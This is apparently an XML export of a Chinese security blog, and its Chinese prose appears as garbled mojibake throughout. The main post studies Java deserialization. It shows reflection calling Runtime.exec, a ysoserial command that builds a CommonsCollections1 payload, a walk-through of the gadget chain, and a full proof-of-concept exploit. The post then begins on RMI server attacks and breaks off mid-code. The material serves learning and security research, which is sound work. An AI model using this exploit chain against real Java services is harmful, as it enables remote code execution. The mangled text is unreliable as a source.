Âú®Ëøô‰∏™Á≥ªÁªü‰∏≠ÂΩìÁÑ∂ÂèØ‰ª•‰ΩøÁî®ÈªëÁôΩÂêçÂçïÁöÑÊñπÂºèÂØπÂèØÂÆû‰æãÂåñÁöÑÁ±ªËøõË°åËøáÊª§Ôºå‰ΩÜËøôÊ†∑‰ºº‰πé‰øÆÂ§çÂæó‰∏çÂΩªÂ∫ï„ÄÇÂ¶ÇÊûú‰ΩøÁî®Ë∞ÉÁî®ÁâπÂÆöÊñπÊ≥ïÁöÑÊñπÂºèÊâßË°å‰ªªÂä°ÔºåÂè™ÈúÄËÆæÁΩÆ‰∏Ä‰∏™ÊØîËæÉÁâπÊÆäÁöÑÊñπÊ≥ïÂêçÔºåËøô‰∏™ÊºèÊ¥ûÂ∞±ÂæàÈöæÂà©Áî®Ëµ∑Êù•‰∫ÜÔºåÂÆûÈôÖ‰∏äËøô‰∏™Á≥ªÁªüÁî®Âà∞ÁöÑquartz‰ªªÂä°Ë∞ÉÂ∫¶Ê°ÜÊû∂Â∞±ÊòØ‰ΩøÁî®Á±ª‰ººÁöÑÊñπÂºèÔºå‰Ωú‰∏∫Ë∞ÉÂ∫¶‰ªªÂä°ÁöÑÁ±ªÁª≠ÂÆûÁé∞quartzÁöÑJobÊé•Âè£ÔºåÂπ∂ÈáçÂÜôexecuteÊñπÊ≥ï„ÄÇ ÂΩìÁÑ∂Ôºå‰ª•‰∏äÂè™ÊòØ‰∏™‰∫∫ÂØπËøô‰∏™ÊºèÊ¥û‰øÆÂ§çÁöÑÂ∞èÂ∞èÁúãÊ≥ïÔºå‰ªÖ‰æõÂèÇËÄÉ„ÄÇ ÂêéËÆ∞Êú¨Êù•ÊÉ≥ÊâæÂà∞Êõ¥È´òÂ§ß‰∏äÁöÑpayloadÔºåÊúÄÂêéËøòÂè™ÊòØÊâæÂà∞ËøáÊª§‰∏ç‰∏•ÁöÑÈóÆÈ¢òÔºåÊÄªÁöÑÊù•ËØ¥ËøòÊòØÂ≠¶Ëâ∫‰∏çÁ≤æ„ÄÇ‰∏çËøá‰∫ÜËß£Âà∞ÂêÑÁßçË°®ËææÂºèËøòÊòØÈ¢áÊúâÊî∂Ëé∑ÔºåÊúÄÂêéÂêÑ‰ΩçÂ∏àÂÇÖËã•ÊÉ≥Âà∞ÂÖ∂‰ªñpayloadÔºåÊúõ‰∏çÂêùËµêÊïô„ÄÇ ÂèÇËÄÉhttps://www.cnblogs.com/r00tuser/p/14693462.html https://doc.ruoyi.vip/ruoyi/document/kslj.html#%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E https://blog.csdn.net/weixin_41725792/article/details/109818161 https://zhuanlan.zhihu.com/p/183902092]]></content>
      <categories>
        <category>‰ª£Á†ÅÂÆ°ËÆ°</category>
      </categories>
      <tags>
        <tag>ÂèçÂ∫èÂàóÂåñ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JAVAÂèçÂ∫èÂàóÂåñÂ≠¶‰π†]]></title>
    <url>%2F2021%2F08%2F24%2FJAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[ÂâçË®ÄÂõûÈ°æÂÆåPHPÂèçÂ∫èÂàóÂåñÔºåÊé•ÁùÄÂ∞±Êù•Â≠¶‰π†JavaÂèçÂ∫èÂàóÂåñ‰∫Ü„ÄÇË∑ùÁ¶ª‰∏ä‰∏ÄÁØáPHPÂèçÂ∫èÂàóÂåñÊ∞¥ÊñáËøáÂéªÂø´Âçä‰∏™Êúà‰∫ÜÔºåÊÑüËßâÊó∂Èó¥ËøáÂæóÂ•ΩÂø´ÂïäÔºåÂú®Êüê‰∫õÁâπÊÆäÊó∂Âàª‰πüÂ•ΩÁÖéÁÜ¨Âïä„ÄÇ‰∏çÁÆ°ÊÄé‰πàËØ¥ÔºåËøôÊÆµÊó∂Èó¥Áúã‰∫ÜÂ•ΩÂ§öJavaÂèçÂ∫èÂàóÂåñÁöÑÊñáÁ´†Ôºå‰πüÂä®ÊâãÂ§çÁé∞‰∫Ü‰∏ãÔºåÂØπÂèçÂ∫èÂàóÂåñÁöÑÂéüÁêÜ„ÄÅÂà©Áî®Êù°‰ª∂„ÄÅÂà©Áî®ÊñπÊ≥ïÊúâ‰∫ÜÂàùÊ≠•ÁöÑËÆ§ËØÜ„ÄÇ ËÉ°ËØå‰∫ÜËøô‰πàÂ§öÔºåÂ∞±‰∏ãÊù•ÊòØÂØπJavaÂèçÂ∫èÂàóÂåñÂ≠¶‰π†ÁöÑËÆ∞ÂΩï„ÄÇ JavaÂ∫èÂàóÂåñÁÆÄ‰ªãJavaÁöÑÂ∫èÂàóÂåñ‰πüÊòØÂíåPHPÂ∫èÂàóÂåñ‰∏ÄÊ†∑Ôºå‰∏∫‰∫ÜÂÆûÁé∞ÂØπË±°ÁöÑÊåÅ‰πÖÂåñ„ÄÇÈô§Ê≠§‰πãÂ§ñÔºåJavaÂ∫èÂàóÂåñËøòÂèØÈÄöËøáÁöÑÁΩëÁªúÈÄö‰ø°ÔºåÂÆûÁé∞Âú®‰∏çÂêåÁöÑÂπ≥Âè∞‰º†ËæìÂØπË±°ÔºåÂá∫Áé∞ÁöÑÂú∫ÊôØÊúâJNDIÁöÑRMIÂíåLADPÁ≠â„ÄÇ JavaÂ∫èÂàóÂåñ‰∏éÂèçÂ∫èÂàóÂåñJava‰∏çÂêå‰∫éPHPÂèØ‰ª•Â∫èÂàóÂåñÂíåÂèçÂ∫èÂàóÂåñ‰ªªÊÑèÁ±ªÔºåJavaÂè™ÊúâÊú¨Á±ªÊàñÁà∂Á±ªÂÆûÁé∞‰∫ÜSerializableÊàñExternalizableÊé•Âè£Ôºå‰∏îËã•ÂÆû‰æãÂèòÈáèÂºïÁî®‰∫ÜÂÖ∂‰ªñÂØπË±°ÔºåËØ•ÂØπË±°‰πüÈúÄË¶ÅËÉΩË¢´Â∫èÂàóÂåñ„ÄÇ 12345678910111213141516171819202122public class Unserialize implements Serializable&#123; public Object obj; public static void main(String[] args) throws Exception &#123; Unserialize obj = new Unserialize(); obj.obj = new SerializableTest(); FileOutputStream out = new FileOutputStream("test.txt"); ObjectOutputStream obj_out = new ObjectOutputStream(out); obj_out.writeObject(obj); out.close(); FileInputStream in = new FileInputStream("test.txt"); ObjectInputStream in_obj = new ObjectInputStream(in); in_obj.readObject(); in_obj.close(); &#125;&#125;class SerializableTest implements Serializable&#123;&#125;class Test &#123;&#125; Ëã•Â∫èÂàóÂåñ‰∏Ä‰∏™Ê≤°ÊúâÂÆûÁé∞SerializableÁöÑÁ±ªÔºåÂàô‰ºöÊäõÂá∫NotSerializableExceptionÂºÇÂ∏∏„ÄÇExternalizableÊòØSerializableÁöÑÂ≠êÁ±ªÔºåÂ∫èÂàóÂåñÁöÑÁî®Ê≥ï‰∏ÄÊ†∑Ôºå‰ΩÜÂøÖÈ°ªÈáçÂÜôreadExternalÂíåwriteExternalÊñπÊ≥ï„ÄÇÂ∫èÂàóÂåñÁöÑÁªìÊûúÊòØ‰ª•ACEDÂºÄÂ§¥ÁöÑÂ≠óËäÇÂ∫èÂàóÔºåJava‰πüÊòØÊåâ‰∏ÄÂÆöÁöÑËßÑÂàôËøõË°åÂ∫èÂàóÂåñÁöÑÔºå‰ΩÜÂ∫èÂàóÂåñÁªìÊûúÁöÑÂèØËØªÊÄßÊ≤°ÊúâPHPÈÇ£‰πàÈ´ò„ÄÇ JavaÂ∫èÂàóÂåñÂπ∂Ê≤°ÊúâPHPËøô‰πàÂ§öÁöÑÈ≠îÊúØÊñπÊ≥ïÔºåÂè™ÊúâÂΩìÂ∫èÂàóÂåñÁöÑÁ±ªÈáçÂÜô‰∫ÜreadObjectÊàñreadExternalÊñπÊ≥ïÔºåÊâçËÉΩ‰Ωú‰∏∫ÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÁöÑÂÖ•Âè£„ÄÇ 12345678910111213141516171819public class Unserialize implements Serializable &#123; private void readObject(ObjectInputStream in) throws Exception &#123; in.defaultReadObject(); Runtime.getRuntime().exec("calc"); &#125; public static void main(String[] args) throws Exception &#123; Unserialize obj = new Unserialize(); FileOutputStream out = new FileOutputStream("test.txt"); ObjectOutputStream obj_out = new ObjectOutputStream(out); obj_out.writeObject(obj); out.close(); FileInputStream in = new FileInputStream("test.txt"); ObjectInputStream in_obj = new ObjectInputStream(in); in_obj.readObject(); in_obj.close(); &#125;&#125; ÂΩìÁÑ∂ÔºåÂÆûÈôÖÊÉÖÂÜµ‰∏ãÊ≤°‰∫∫‰ºöÁõ¥Êé•Âú®readObject‰∏≠ÂÜô‰∏™ÂëΩ‰ª§ÊâßË°åÁöÑÂäüËÉΩ„ÄÇÈÄöÂ∏∏ÊÉÖÂÜµ‰∏ãÔºåÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÈÉΩÊòØ‰ΩøÁî®Â§ö‰∏™ÂèØÂ∫èÂàóÂåñÁöÑÁ±ªÂΩ¢ÊàêÂà©Áî®ÈìæÔºåÁÑ∂ÂêéÂà©Áî®ÂèçÂ∞ÑÊú∫Âà∂ÂÆûÁé∞ÊÉ≥Ë¶ÅÁöÑÂäüËÉΩ„ÄÇ JavaÂèçÂ∞ÑÊú∫Âà∂ÂèçÂ∞ÑÊú∫Âà∂ÂèØ‰ª•ÂÆûÁé∞Âú®ÁºñËØëÊó∂Êó†ÈúÄÁ°ÆÂÆöÊâÄ‰ΩøÁî®ÁöÑÁöÑÁ±ªÔºåÂú®ËøêË°åÊó∂ÂÜçÁ°ÆÂÆö„ÄÇÂØπ‰ªªÊÑè‰∏Ä‰∏™Á±ªÔºåÈÉΩËÉΩÁü•ÈÅìËøô‰∏™Á±ªÁöÑÊâÄÊúâÂ±ûÊÄßÂíåÊñπÊ≥ïÔºåÂØπ‰ªªÊÑè‰∏Ä‰∏™ÂØπË±°ÔºåÈÉΩËÉΩË∞ÉÁî®ÂÆÉÁöÑ‰ªªÊÑè‰∏Ä‰∏™ÊñπÊ≥ïÂíåÂ±ûÊÄß„ÄÇ ‰ª•‰∏ã‰ª£Á†ÅÊòØ‰ª•ÂèçÂ∞ÑÁöÑÊñπÂºèÂÆûÁé∞ÂºπËÆ°ÁÆóÂô®ÔºåÂÖàÂêéÈÄöËøáClass.forNameËé∑ÂèñClassÂÆû‰æãÔºåÁÑ∂ÂêégetMethodËé∑ÂèñÊñπÊ≥ïÔºåÊúÄÂêéinvokeË∞ÉÁî®ÊñπÊ≥ï„ÄÇÂØπ‰∫é‰∏Ä‰∫õÈúÄË¶Å‰ΩøÁî®ÂÆû‰æãË∞ÉÁî®ÁöÑÊñπÊ≥ïÔºåÈ¶ñÂÖàÈúÄË¶ÅÈÄöËøágetConstructorÊñπÊ≥ïËé∑ÂèñÊûÑÈÄ†ÊñπÊ≥ïÂÆû‰æãÔºåÂÜçË∞ÉÁî®newInstanceÊñπÊ≥ïËé∑ÂèñËØ•Á±ªÁöÑÂÆû‰æã„ÄÇ 12345678public class Reflect &#123; public static void main(String[] args) throws Exception &#123; Class runtime = Class.forName("java.lang.Runtime"); Method getRuntime = runtime.getMethod("getRuntime"); Method exec = runtime.getMethod("exec",String.class); exec.invoke(getRuntime.invoke(runtime), "calc"); &#125;&#125; ‰∏äÈù¢ÂΩ¢Â¶ÇgetXXXÁöÑÊñπÊ≥ïÈÉΩÊòØÂè™ËÉΩËé∑ÂèñÈªòËÆ§ÊûÑÈÄ†ÂáΩÊï∞ÊàñÂÖ¨ÊúâÊñπÊ≥ïÂíåÂ±ûÊÄßÔºåËé∑ÂèñÈùûÈªòËÆ§ÊûÑÈÄ†ÂáΩÊï∞ÊàñÈùûÂÖ¨ÊúâÊñπÊ≥ïÂíåÂ±ûÊÄßÈúÄË¶Å‰ΩøÁî®ÂΩ¢Â¶ÇgetDeclaredXXXÁöÑÊñπÊ≥ïÔºåÈùûÂÖ¨ÊúâÊñπÊ≥ïÂíåÂ±ûÊÄßËøòÈúÄ‰ΩøÁî®setAccessibleÊñπÊ≥ïËÆæÁΩÆÂèØËÆøÈóÆ„ÄÇ 1234567891011121314151617181920212223242526public class Reflect &#123; public static void main(String[] args) throws Exception &#123; Class reflectTest = Class.forName("com.test.ReflectTest"); Constructor constructor = reflectTest.getDeclaredConstructor(String.class); Object test = constructor.newInstance("calc"); Method execute = reflectTest.getDeclaredMethod("execute"); execute.setAccessible(true); execute.invoke(test); &#125;&#125;class ReflectTest &#123; private String cmd; ReflectTest() &#123; &#125; ReflectTest(String cmd) &#123; this.cmd = cmd; &#125; private void execute() throws IOException &#123; if (cmd.isEmpty()) cmd = "calc"; Runtime.getRuntime().exec(cmd); &#125;&#125; ÂèçÂ∫èÂàóÂåñÂà©Áî®ÂèçÂ∫èÂàóÂåñÂà©Áî®Â§çÁé∞ÁªèÂÖ∏ÁöÑCommonsCollectionsPOPÈìæÔºåËøòÊúâRMIÊîªÂáªÊúçÂä°Á´ØÂíåJNDIÊ≥®ÂÖ•„ÄÇ CommonsCollections1CommonsCollections1ÊòØJavaÂèçÂ∫èÂàóÂåñÂà©Áî®Â∑•ÂÖ∑ysoserialÂÖ∂‰∏≠ÁöÑ‰∏Ä‰∏™payloadÔºåÁî±‰∫écommons-collectionsËøô‰∏™‰æùËµñÂåÖÂ∫îÁî®ÂæàÂπøÊ≥õÔºåÊâÄ‰ª•Ëøô‰∏™payloadÂæàÈÄöÁî®Ôºå‰ΩÜÂØπjreÊòØÊúâË¶ÅÊ±ÇÁöÑÔºåÁâàÊú¨ÈúÄË¶ÅÂú®1.7u21‰ª•‰∏ã„ÄÇ POPÈìæÊûÑÈÄ†ÔºåÊú¨ÊñáÈÄöËøá‰∏ãÊñ≠ÁÇπË∞ÉËØïÊù•Â≠¶‰π†„ÄÇCommonsCollections1ÁöÑpayload‰ΩøÁî®‰ª•‰∏ãÁöÑÂëΩ‰ª§ÁîüÊàêÔºåÂÄºÂæóÊ≥®ÊÑèÁöÑÊòØÔºåwindows‰∏ã‰∏çËÉΩÁî®powershellÁîüÊàêpayloadÔºåÁîüÊàêÁöÑpayloadÊòØÈîôÁöÑÔºå‰ºöÂ§öÂá∫Êù•00Â≠óËäÇ„ÄÇ 1java -jar .\ysoserial.jar CommonsCollections1 "calc.exe" &gt; cc.bin ÂèçÂ∫èÂàóÂåñÁöÑÂÖ•Âè£Áõ¥Êé•ÈÄöËøáÊñá‰ª∂ËæìÂÖ•Â∫èÂàóÂåñÂÜÖÂÆπÂπ∂ÂèçÂ∫èÂàóÂåñÂç≥ÂèØÔºåÂêåÊó∂ÈúÄË¶ÅÂú®RuntimeÁöÑexecÊñπÊ≥ï‰∏ã‰∏™Êñ≠ÁÇπ„ÄÇ 1234567public class DebugUnserialize &#123; public static void main(String[] args) throws Exception&#123; FileInputStream file = new FileInputStream("cc1.bin"); ObjectInputStream in = new ObjectInputStream(file); in.readObject(); &#125;&#125; ÂêØÂä®Ë∞ÉËØïÂ∞±ËÉΩÂú®IDEA‰∏≠ÁúãÂà∞Ë∞ÉÁî®Ê†àÔºåÈô§ÂéªÂèçÂ∫èÂàóÂåñÂíåÊ≠£Â∏∏invokeÊñπÊ≥ïÁöÑË∞ÉÁî®Ôºå‰∏éÂèçÂ∫èÂàóÂåñPOPÈìæÁõ∏ÂÖ≥ÁöÑË∞ÉÁî®Ê†àÊúâÁ∫¢Ê°ÜËøô‰∏âÂùóÔºå‰∏ªË¶ÅÁöÑÊòØ‰∏≠Èó¥Ëøô‰∏ÄÂùó„ÄÇ ‰ªéÊ†àÈ°∂ÂæÄÊ†àÂ∫ïÁúãÔºåInvokerTransformerÁöÑtransformÊñπÊ≥ïÊúÄÁªàÂèçÂ∞ÑË∞ÉÁî®RuntimeÁöÑexecÊñπÊ≥ï„ÄÇË∑üËøõInvokerTransformerÁöÑtransformÊñπÊ≥ïÔºåÂΩìinputÈùûÁ©∫Êó∂‰ºöËøõË°å‰∏Ä‰∏™ÂèçÂ∞ÑÊñπÂºèË∞ÉÁî®ÊñπÊ≥ïÁöÑÊìç‰Ωú„ÄÇiMethodName„ÄÅiParamTypesÂíåiArgsÊòØInvokerTransformerÁöÑÂ±ûÊÄßÔºåÂ±û‰∫éÂèØÊéßÂèòÈáèÔºåËÄåinput‰∏çÊòØËØ•Á±ªÁöÑÂ±ûÊÄßÔºåÊ≠§Êó∂inputÁöÑÂÄº‰∏∫RuntimeÁöÑÂÆû‰æã„ÄÇ ÂõûÊ∫ØÂà∞ChainedTransformerÁöÑtransformÊñπÊ≥ïÔºå‰∏Ä‰∏™forÂæ™ÁéØÈÅçÂéÜiTransformersÂ±ûÊÄßÔºåÂπ∂Ë∞ÉÁî®‰ªñÁöÑtransformÊñπÊ≥ïÔºåËØ•ÊñπÊ≥ïÁöÑobjectÂèÇÊï∞Èô§‰∫ÜÁ¨¨‰∏Ä‰∏™‰πãÂ§ñÔºåÂÖ∂‰ªñÈÉΩÊòØ‰∏ä‰∏Ä‰∏™Âæ™ÁéØtransformÁöÑËøîÂõûÂÄº„ÄÇ 123456public Object transform(Object object) &#123; for (int i = 0; i &lt; iTransformers.length; i++) &#123; object = iTransformers[i].transform(object); &#125; return object;&#125; iTransformersÊòØ‰∏Ä‰∏™TransformerÊï∞ÁªÑÔºåËÄåTransformerÊòØ‰∏Ä‰∏™Êé•Âè£Ôºå‰∏äÈù¢ÁöÑ‰∏§‰∏™Á±ªChainedTransformerÂíåInvokerTransformerÈÉΩÂÆûÁé∞‰∫ÜËøô‰∏™Êé•Âè£„ÄÇÂΩìÂâçiTransformersÁöÑÂ§ßÂ∞è‰∏∫5ÔºåÂåÖÂê´‰∏Ä‰∏™ConstantTransformerÔºå‰∏â‰∏™InvokerTransformerÔºåÂÜçÂä†‰∏Ä‰∏™ConstantTransformerÔºåÊÑüËßâÊï¥‰∏™POPÈìæÊúÄÂ∑ßÂ¶ôÁöÑÂ∞±Âú®ËøôÈáå„ÄÇ Á¨¨‰∏Ä‰∏™ConstantTransformerÁõ¥Êé•ËøîÂõû‰ªñÁöÑiConstantÂ±ûÊÄßÔºåÊ≠§Êó∂iConstant‰∏∫RuntimeÁöÑClassÂÆû‰æã„ÄÇ Êé•ÁùÄÁöÑInvokerTransformerÔºåÁªèËøá‰∏ÄÊ¨°getMethodÂÜçÂä†‰∏ÄÊ¨°ÂèçÂ∞ÑÊñπÂºèË∞ÉÁî®ÁöÑgetMethodËé∑ÂèñÂà∞getRuntimeÁöÑMethodÂÆû‰æãÔºåÂπ∂ËøîÂõû„ÄÇ Êé•ÁùÄÁöÑInvokerTransformerÔºåÁªèËøá‰∏§Ê¨°invokeË∞ÉÁî®‰∫Ü‰∏ä‰∏Ä‰∏™Âæ™ÁéØËøîÂõûgetRuntimeÊñπÊ≥ïÔºåÂπ∂ËøîÂõûÊâßË°åÁªìÊûú„ÄÇËøôÈáåÁöÑiArgs‰πüÂ∞±ÊòØÁ¨¨‰∫åÊ¨°ÁöÑinvokeÁöÑÂèÇÊï∞ÔºåÊòØ‰∏Ä‰∏™nullÂíå‰∏Ä‰∏™Á©∫ObjectÊï∞ÁªÑÔºåÂÜçÂ§çÁé∞Êó∂ÊääÊàëÊï¥Êáµ‰∫ÜÔºå‰∏∫Âï•‰∏çÁî®ÂØπË±°Ë∞ÉÁî®getRuntimeÊñπÊ≥ï„ÄÇÂêéÈù¢ÊÉ≥Ëµ∑Êù•getRuntimeÊòØÈùôÊÄÅÊñπÊ≥ïÔºåÊü•ËµÑÊñôÂæóÁü•ÈùôÊÄÅÊñπÊ≥ïÁî®invokeÂèçÂ∞ÑË∞ÉÁî®ÔºåÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞‰º†nullÂç≥ÂèØ„ÄÇ ÊúÄÂêé‰∏Ä‰∏™InvokerTransformerÂà©Áî®‰∏ä‰∏Ä‰∏™Âæ™ÁéØgetRuntimeËøîÂõûÁöÑRuntimeÂÆû‰æãÔºåÂèçÂ∞ÑË∞ÉÁî®execÊâßË°åÂëΩ‰ª§„ÄÇ ÁªßÁª≠ÂõûÊ∫ØÔºåË∑üËøõÂà∞LazyMapÁöÑgetÊñπÊ≥ïÔºåmapÂ±ûÊÄß‰∏çÂ≠òÂú®ÈîÆ‰∏∫keyÁöÑÂÄºÔºåÁÑ∂Âêé‰ΩøÁî®factoryÂ±ûÊÄßË∞ÉÁî®tranformÊñπÊ≥ï„ÄÇËøôÈáå‰ª§factory‰∏∫‰∏ã‰∏ÄË∞ÉÁî®Ê†àÈáåÁöÑChainedTransformerÂç≥ÂèØ„ÄÇ ÂÜçÁªßÁª≠ÂõûÊ∫ØÔºåÂú®AnnotationInvocationHandlerÁöÑinvokeÊñπÊ≥ïÈáåÈù¢‰ΩøÁî®Ë∞ÉÁî®memberValuesÂ±ûÊÄßË∞ÉÁî®getÊñπÊ≥ï„ÄÇ 1234567891011121314public Object invoke(Object var1, Method var2, Object[] var3) &#123; String var4 = var2.getName(); Class[] var5 = var2.getParameterTypes(); if (var4.equals("equals") &amp;&amp; var5.length == 1 &amp;&amp; var5[0] == Object.class) &#123; return this.equalsImpl(var3[0]); &#125; else if (var5.length != 0) &#123; throw new AssertionError("Too many parameters for an annotation method"); &#125; else &#123; ... switch(var7) &#123; case 0: ... default: Object var6 = this.memberValues.get(var4); AnnotationInvocationHandlerÊòØÈùûÂÖ¨ÊúâÁöÑÁ±ªÔºåÈúÄË¶ÅÂèçÂ∞ÑÊù•ÊûÑÈÄ†ÔºåÂîØ‰∏ÄÁöÑ‰∏Ä‰∏™ÊûÑÈÄ†ÂáΩÊï∞ÁöÑÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞ÈúÄË¶ÅÊòØÊ≥®Ëß£ÁöÑÁ±ªÔºå‰∏îÂ≠òÂú®‰∏Ä‰∏™Êé•Âè£ÔºåÊé•Âè£‰πüÊòØÈúÄË¶ÅÊúâÊ≥®Ëß£ÔºåÂê¶ÂàôÂ∞±‰ºöÊäõÂá∫‰∏Ä‰∏™AnnotationFormatErrorÂºÇÂ∏∏„ÄÇ 123456789AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123; Class[] var3 = var1.getInterfaces(); if (var1.isAnnotation() &amp;&amp; var3.length == 1 &amp;&amp; var3[0] == Annotation.class) &#123; this.type = var1; this.memberValues = var2; &#125; else &#123; throw new AnnotationFormatError("Attempt to create proxy for a non-annotation type."); &#125;&#125; Âú®java.lang.annotaionÂåÖ‰∏ãÂæàÂ§öÊé•Âè£ÈÉΩÊª°Ë∂≥Ëøô‰∏™Êù°‰ª∂„ÄÇ Âú®ÂæÄ‰∏äÂõûÊ∫ØÔºåÂèëÁé∞Âπ∂Ê≤°ÊúâÁõ¥Êé•Ë∞ÉÁî®invokeÊñπÊ≥ïÔºåÂõ†‰∏∫ËøôÈáåÁî®Âà∞‰∫ÜÂä®ÊÄÅ‰ª£ÁêÜÊú∫Âà∂ÔºåÂΩìÁîüÊàêÁöÑ‰ª£ÁêÜÂÆû‰æãË∞ÉÁî®ÊñπÊ≥ïÊó∂‰ºöÂÖàË∞ÉÁî®Á±ªÈáåÁöÑinvokeÊñπÊ≥ï„ÄÇAnnotationInvocationHandlerÂÆûÁé∞‰∫ÜInvocationHandlerÊé•Âè£ÔºåÊâÄ‰ª•ÂÜçÂæÄ‰∏äÂõûÊ∫ØÂèàÊòØ‰∏Ä‰∏™AnnotationInvocationHandlerÔºå‰ΩÜÂÆÉÁöÑmemberValuesÂ±ûÊÄßÊòØAnnotationInvocationHandlerÁöÑ‰ª£ÁêÜÂÆû‰æã„ÄÇ ÊúÄÂêéÂÆåÊï¥ÁöÑPOCÔºö 12345678910111213141516171819202122232425262728293031323334353637383940package com.test;import org.apache.commons.collections.*;import org.apache.commons.collections.functors.*;import org.apache.commons.collections.map.LazyMap;import java.io.*;import java.lang.annotation.Retention;import java.lang.reflect.*;import java.util.*;public class ApacheCommonsCollections1 &#123; public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", null&#125;), new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"calc.exe"&#125;), new ConstantTransformer(1) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); Map map = LazyMap.decorate(new HashMap(), chainedTransformer); Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler"); Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Retention.class, map); Map map1 = (Map) Proxy.newProxyInstance( Map.class.getClassLoader(), new Class[]&#123;Map.class&#125;, invocationHandler ); Object obj = constructor.newInstance(Retention.class, map1); FileOutputStream fileOutputStream = new FileOutputStream("cc1.txt"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(obj); &#125;&#125; CommonsCollectionsÂêéÈù¢Âá†Êù°ÈìæÁúã‰∫Ü‰∏ãÊúÄÂêéÈÉΩÊòØÈÄöËøátransformÊñπÊ≥ïÂèçÂ∞ÑÊâßË°åÂëΩ‰ª§ÁöÑÔºåÂ∞±ÊòØÂÖ•Âè£Á±ªÂíå‰∏≠Èó¥Ë°îÊé•Á±ª‰∏ç‰∏ÄÊ†∑ÔºåCommonsCollections5‰πüË∑ü‰∫Ü‰∏ãÔºåÊó†ÈúÄÂä®ÊÄÅ‰ª£ÁêÜÔºåÁõ∏ÊØîCommonsCollections1ÊûÑÈÄ†Ëµ∑Êù•ËøòÊõ¥ÁÆÄÂçï„ÄÇ RMIÊîªÂáªÊúçÂä°Á´ØÊîªÂáªÊúçÂä°Á´ØÁöÑÊñπÂºèÊàëÁúãÂà∞Êúâ‰∏§Áßç(ÂèØËÉΩËøòÊúâÊõ¥Â§öÁöÑÊàë‰∏çÁü•ÈÅì)Ôºå‰∏ÄÁßçÊòØËøúÁ®ãÊñπÊ≥ïÁöÑÂèÇÊï∞ÊúâÈÄöËøáÁ±ªÂÆû‰æãÁöÑÔºåÊûÑÈÄ†ÊÅ∂ÊÑèÁöÑÂÆû‰æã‰º†ËøáÂéªÔºõÂè¶‰∏ÄÁßçÊòØ‰ΩøÁî®bindÊñπÊ≥ïÊ≥®ÂÜåÁªëÂÆö‰∏Ä‰∏™ÊÅ∂ÊÑèÁöÑÂÆû‰æã„ÄÇ ËøúÁ®ãÊñπÊ≥ïÂèÇÊï∞ÊúâÁ±ªÂÆû‰æã Áî±‰∫éRMI‰º†ÁöÑÂèÇÊï∞ÈÉΩÊòØÁªèËøáÂ∫èÂàóÂåñÁöÑÔºåÈÇ£‰πàÂú®ÊúçÂä°Á´ØÈÇ£ËæπÂ∞±‰ºöËøõË°åÂèçÂ∫èÂàóÂåñËøòÂéüÂØπË±°„ÄÇËøôÈáåÊàëÂ∞±ÊÉ≥Âà∞‰∫Ü‰∏™ÈóÆÈ¢òÔºåÂÆûÁé∞ËøúÁ®ãÊñπÊ≥ïÁöÑÁ±ªÊ≤°ÊúâÂÆûÁé∞Serializable‰∏∫‰ªÄ‰πàÂèàËÉΩË¢´Â∫èÂàóÂåñÂë¢ÔºüÂéüÂõ†Â∞±Âú®ÂÆûÁé∞ËøúÁ®ãÊñπÊ≥ïÁöÑÁ±ªÁªßÊâøÁöÑUnicastRemoteObjectÁ±ª‰∏äÔºåÂè™Ë¶Å‰∏ÄÁõ¥ÂõûÊ∫ØÔºå‰∏çÈöæÂèëÁé∞UnicastRemoteObjectÁöÑÊúÄÁªàÁà∂Á±ªÊòØRemoteObjectÔºåÊòØÂÆÉÂÆûÁé∞‰∫ÜSerializable„ÄÇ Áé∞Âú®Êàë‰ª¨ÂèÇÊï∞‰º†‰∏Ä‰∏™Á≤æÂøÉÊûÑÈÄ†ÁöÑÂèçÂ∫èÂàóÂåñÈìæÂ∞±ËÉΩÈÄ†ÊàêÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÔºå‰ΩÜÂ¶ÇÊûúËøô‰∏™ÂèÇÊï∞ÁöÑÁ±ª‰∏çËÉΩ‰Ωú‰∏∫ÂèçÂ∫èÂàóÂåñÁöÑÂÖ•Âè£Á±ªÁöÑËØùÔºåÊàë‰ª¨ÈÄöËøáÂÖ•Âè£Á±ªÁªßÊâøÂéüÊù•ÁöÑÁ±ªÔºåÂÆûÁé∞ÂèçÂ∫èÂàóÂåñ‰ªªÊÑèÁ±ª„ÄÇËøôÈáåËøòÊòØ‰ª•CommonsCollections‰∏∫‰æãÔºå‰ΩÜ‰øÆÊîπCommonsCollectionsÂéüÊúâÁöÑÂÖ•Âè£Á±ªÊå∫È∫ªÁÉ¶ÁöÑÔºåDemoÁÆÄÂåñ‰∏Ä‰∏ãÔºåÊúçÂä°Á´ØÂàöÂ•ΩÊúâ‰∏Ä‰∏™ÂÆûÁé∞‰∫ÜSerializableÁöÑÁ±ªÔºåÁ±ªÈáåËøòÊúâ‰∏Ä‰∏™ObjectÂ±ûÊÄß„ÄÇ 123 class Exploit implements Serializable &#123; Object obj;&#125; ÊúçÂä°Á´ØËøúÁ®ãÊñπÊ≥ïÁöÑÂèÇÊï∞ÊòØExceptionÁ±ªÔºåÈÇ£‰πàÂÆ¢Êà∑Á´ØÁöÑExploitÂ∞±ÊúâÁ®çÁ®ç‰øÆÊîπ‰∏ãÔºåÁªßÊâøExceptionÁ±ª„ÄÇ 123 class Exploit extends Exception 